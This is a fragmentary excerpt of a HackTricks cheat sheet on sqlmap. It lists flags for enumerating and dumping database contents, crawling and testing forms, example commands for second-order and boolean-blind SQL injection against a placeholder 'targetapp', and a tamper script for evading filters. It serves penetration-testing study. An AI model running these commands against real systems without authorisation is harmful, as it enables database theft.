...
source_url: https://hacktricks.wiki/pentesting-web/sql-injection/sqlmap/index.html
...
```
--all # Enumerate all available information
--dump # Dump rows from selected DBMS tables
--dbs # Enumerate database names
--tables # Enumerate tables in -D <DB NAME>
--columns # Enumerate columns in -D <DB NAME> -T <TABLE NAME>
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> # Dump one selected column
```
...
--batch = answer prompts with sqlmap's defaults
--crawl = recursively follow links to the requested depth
--forms = parse forms and test their input fields
```
### Second Order Injection

```
# Revisit a separate endpoint after storing the first-order payload
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
# Joomla administration example
...
```
# Mark a string that is absent from true responses to calibrate boolean-blind detection
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### Tamper

Remember that **you can create your own tamper in python** and it’s very simple. You can find a tamper example in the [Second Order Injection page here](second-order-injection-sqlmap.html).
...
| equaltolike.py | Replaces all occurrences of the equality operator (‘=’) with `LIKE` |
